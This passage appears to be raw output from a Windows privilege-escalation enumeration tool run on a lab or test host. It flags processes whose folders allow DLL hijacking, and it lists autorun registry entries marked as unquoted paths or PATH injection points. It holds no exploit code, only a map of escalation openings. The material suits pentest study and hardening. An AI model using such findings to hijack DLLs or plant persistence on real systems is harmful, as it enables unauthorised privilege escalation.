    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts
   =================================================================================================

    msdtc(3924)[C:\Windows\System32\msdtc.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\msdtc.exe
   =================================================================================================

    svchost(3040)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -s ScDeviceEnum
   =================================================================================================

    svchost(4352)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================

    msedgewebview2(10152)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=renderer --noerrdialogs --user-data-dir="C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --js-flags="--harmony-weak-refs-with-cleanup-some --expose-gc" --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=23914751344 --mojo-platform-channel-handle=3212 --field-trial-handle=1928,i,15664937513237927659,16349251277674059669,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:1
   =================================================================================================

    svchost(1332)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s TimeBrokerSvc
   =================================================================================================

    LogonUI(3916)[C:\Windows\system32\LogonUI.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "LogonUI.exe" /flags:0x2 /state0:0xa388f855 /state1:0x41c64e6d
   =================================================================================================

    svchost(5636)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s Netman
   =================================================================================================

    svchost(1324)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -s W32Time
   =================================================================================================

    svchost(6064)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc
   =================================================================================================

    msedge(10804)[C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe] -- POwn: Administrator
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\Edge\Application (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start /prefetch:5
   =================================================================================================

    fontdrvhost(888)[C:\Windows\system32\fontdrvhost.exe] -- POwn: UMFD-0
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "fontdrvhost.exe"
   =================================================================================================

    svchost(2340)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService
   =================================================================================================

    rdpclip(6920)[C:\Windows\System32\rdpclip.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: rdpclip
   =================================================================================================

    svchost(1316)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s nsi
   =================================================================================================

    fontdrvhost(884)[C:\Windows\system32\fontdrvhost.exe] -- POwn: UMFD-1
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "fontdrvhost.exe"
   =================================================================================================

    msedgewebview2(7776)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=utility --noerrdialogs --user-data-dir="C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=2112 --field-trial-handle=1928,i,15664937513237927659,16349251277674059669,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:8
   =================================================================================================

    winlogon(8204)[C:\Windows\system32\winlogon.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: winlogon.exe
   =================================================================================================

    svchost(876)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k DcomLaunch -p
   =================================================================================================

    svchost(1736)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s EventSystem
   =================================================================================================

    svchost(1300)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
   =================================================================================================

    vmtoolsd(3020)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: SYSTEM
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files\VMware\VMware Tools (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
   =================================================================================================

    ctfmon(6036)[C:\Windows\system32\ctfmon.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "ctfmon.exe"
   =================================================================================================

    TextInputHost(10776)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca
   =================================================================================================


...


...

════════════════════════════════════╣ Applications Information ╠════════════════════════════════════


╔══════════╣ Autorun Applications
╚ Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\,C:\Program Files\VMware,C:\Program Files\VMware\VMware Tools\vmtoolsd.exe 
    FilePerms: Administrators [Allow: AllAccess]
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrator [Allow: FullControl], Administrators [Allow: FullControl]
    Key: OneDrive
    Folder: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive
    FolderPerms: Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
    File: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrator [Allow: FullControl], Administrators [Allow: FullControl]
    Key: MicrosoftEdgeAutoLaunch_98769996E24836F99EC8617644423B4C
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application
    FolderPerms: Administrators [Allow: AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5 (Unquoted and Space detected) - C:\,C:\Program Files ,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe 
    FilePerms: Administrators [Allow: AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Administrator [Allow: Delete], Administrators [Allow: AllAccess] (Unquoted and Space detected) - C:\ProgramData\Microsoft\Windows,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    RegPerms: Administrators [Allow: GenericAll FullControl]
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Administrator [Allow: Delete], Administrators [Allow: AllAccess] (Unquoted and Space detected) - C:\ProgramData\Microsoft\Windows,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: Userinit
    Folder: C:\Windows\system32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    RegPerms: Administrators [Allow: FullControl]
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    RegPerms: Administrators [Allow: FullControl GenericAll]
    Folder: C:\Program Files\Internet Explorer
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\,C:\Program Files,C:\Program Files\Internet Explorer\iexplore.exe 
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: *kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64base
    Folder: None (PATH Injection)
    File: wow64base.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64con
    Folder: None (PATH Injection)
    File: wow64con.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: xtajit64
    Folder: None (PATH Injection)
    File: xtajit64.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [Allow: AppendData/CreateDirectories], Administrators [Allow: AllAccess]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
    Folder: C:\Windows\system32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
    Folder: C:\Windows\System32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
    Folder: C:\Windows\System32
    FolderPerms: Administrators [Allow: WriteData/CreateFiles]
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    RegPerms: Administrators [Allow: FullControl]
    Key: StubPath
